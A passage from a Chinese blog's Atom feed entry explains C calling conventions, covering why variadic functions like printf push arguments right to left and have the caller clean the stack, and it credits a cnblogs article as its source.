color="red">**若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。**</font><ul><li><p>首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！</p></li><li><p>其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。</p></li></ul><p>C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。</p></blockquote><h3 id="0x03-转载来源"><a href="#0x03-转载来源" class="headerlink" title="0x03 转载来源"></a><font color="navy">0x03 转载来源</font></h3><p> <a href="https://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-常见的调用约定&quot;&gt;&lt;a href=&quot;#0x00-常见的调用约定&quot; class=&quot;headerlink&quot; title=&quot;0x00 常见的调用约定&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;0x00 常见的调用约定&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
